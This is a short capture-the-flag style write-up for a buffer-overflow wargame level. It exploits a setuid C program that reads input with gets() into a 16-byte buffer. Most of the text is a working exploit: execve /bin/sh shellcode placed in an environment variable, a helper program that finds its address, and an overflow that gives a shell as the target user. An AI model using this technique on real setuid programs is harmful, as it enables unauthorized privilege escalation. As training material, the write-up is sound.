# Level3

## This level's goal
- LEVEL3 (cobolt -> goblin) : small buffer + stdin

***

```
[cobolt@localhost cobolt]$ bash2
[cobolt@localhost cobolt]$ ls -l
total 16
-rwsr-sr-x    1 goblin   goblin      11824 Feb 26  2010 goblin
-rw-r--r--    1 root     root          193 Mar 29  2010 goblin.c

[cobolt@localhost cobolt]$ cat goblin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

This level's code seems like level2 but there is the difference of gets function. (level2 is strcpy)

This concept is totally same like level2, but I will exploit with the diffence way. (Use stdin)

```
[cobolt@localhost cobolt]$ export EGG=`python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`

[cobolt@localhost cobolt]$ echo 'int main() { printf("EGG -> 0x%x\n", getenv("EGG")); } ' > getegg.c
[cobolt@localhost cobolt]$ gcc getegg.c -o getegg
[cobolt@localhost cobolt]$ ./getegg
EGG -> 0xbffffea7

[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\xa7\xfe\xff\xbf"'; cat) | ./goblin
AAAAAAAAAAAAAAAAAAAA§þÿ¿
id
uid=503(goblin) gid=502(cobolt) egid=503(goblin) groups=502(cobolt)
my-pass
euid = 503
hackers proof
```
